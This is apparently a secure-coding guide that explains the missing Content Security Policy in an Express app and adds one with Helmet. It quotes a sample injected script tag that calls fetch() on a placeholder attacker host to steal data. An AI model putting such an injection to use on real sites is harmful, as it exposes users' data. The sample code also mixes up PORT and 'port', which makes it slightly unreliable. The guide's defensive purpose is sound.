# Content Security Policy

This application doesn't use a Content Security Policy (CSP). CSP is an added layer of security that helps to mitigate certain types of attacks, such as Cross-Site Scripting (XSS) and data injection attacks. Without CSP, an attacker can inject malicious scripts.

For example, an attacker could find a vulnerability enabling them to inject a script:

```javascript
// Malicious script injection example
<script>fetch('https://malicious-website.com/steal-data')</script>
```

## Remediating the Vulnerability

To mitigate this vulnerability, we can add a CSP that only allows scripts from trusted sources.

### Update `index.js` to Include CSP Headers

```javascript
import helmet from 'helmet'; // Add this line

// Use Helmet to set security headers
app.use(helmet());

// Setting up CSP
app.use(
  helmet.contentSecurityPolicy({
    useDefaults: true,
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
    },
  })
);

// Serve static files from the "views" directory
app.use(express.static('views'));

// Route to fetch data from the database
app.get('/data', async (req, res) => {
  const db = await open({
    filename: './database.sqlite',
    driver: sqlite3.Database,
  });
  const rows = await db.all('SELECT * FROM data');
  res.json(rows);
});

// Start the Express server
app.listen(PORT, async () => {
  console.log(`App running at http://localhost:${port}`);

  // Initialize database and create table
  const db = await open({
    filename: './database.sqlite',
    driver: sqlite3.Database,
  });

  await db.exec(
    'CREATE TABLE IF NOT EXISTS data (id INTEGER PRIMARY KEY, value TEXT)'
  );
  const existingData = await db.all('SELECT * FROM data');
  if (existingData.length === 0) {
    await db.run('INSERT INTO data (value) VALUES (?)', ['Sample data']);
  }
});
```

## Explanation and Verification

By using the Helmet middleware, especially its CSP module, we add critical HTTP headers to prevent most forms of XSS attacks. The `defaultSrc` and `scriptSrc` directives ensure that only scripts from our own domain are allowed.

### Testing the Fix

- Start the server and visit <http://localhost:3000>
- Open your browser's developer tools (F12) and navigate to the 'Network' or 'Console' tab.
- Ensure that the CSP headers are applied correctly.
- Verify that inline scripts and external scripts from untrusted sources are blocked by attempting to inject malicious scripts and observing if they get blocked.
